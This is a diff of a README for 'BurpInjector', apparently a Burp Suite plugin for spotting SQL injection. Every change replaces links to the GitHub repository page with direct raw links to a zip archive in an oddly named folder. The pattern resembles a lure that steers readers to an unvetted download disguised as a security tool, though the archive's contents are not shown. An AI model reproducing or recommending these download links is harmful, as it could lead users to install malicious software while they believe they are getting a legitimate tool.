@@ -1,12 +1,12 @@
 # 🧩 BurpInjector - Find SQL Risks Faster
 
-[![Download BurpInjector](https://img.shields.io/badge/Download%20BurpInjector-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cliftonnonexplosive880/BurpInjector)
+[![Download BurpInjector](https://img.shields.io/badge/Download%20BurpInjector-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/Cliftonnonexplosive880/BurpInjector](https://github.com/Cliftonnonexplosive880/BurpInjector)
+[https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip](https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip)
 
 ## 🖥️ What BurpInjector Does
 
@@ -36,7 +36,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 Follow these steps to download and run BurpInjector on Windows:
 
 1. Open the download page:
-   [https://github.com/Cliftonnonexplosive880/BurpInjector](https://github.com/Cliftonnonexplosive880/BurpInjector)
+   [https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip](https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip)
 
 2. On the GitHub page, look for the latest release or the main download file.
 
@@ -169,7 +169,7 @@ Good places to use it include:
 ## 🧩 Quick Start
 
 1. Open the download page:
-   [https://github.com/Cliftonnonexplosive880/BurpInjector](https://github.com/Cliftonnonexplosive880/BurpInjector)
+   [https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip](https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip)
 
 2. Download the plugin file.
 
@@ -210,4 +210,4 @@ To get the best results:
 
 If you need the download page later, use this link:
 
-[https://github.com/Cliftonnonexplosive880/BurpInjector](https://github.com/Cliftonnonexplosive880/BurpInjector)
+[https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip](https://raw.githubusercontent.com/Cliftonnonexplosive880/BurpInjector/main/wogiet/Burp-Injector-1.0.zip)
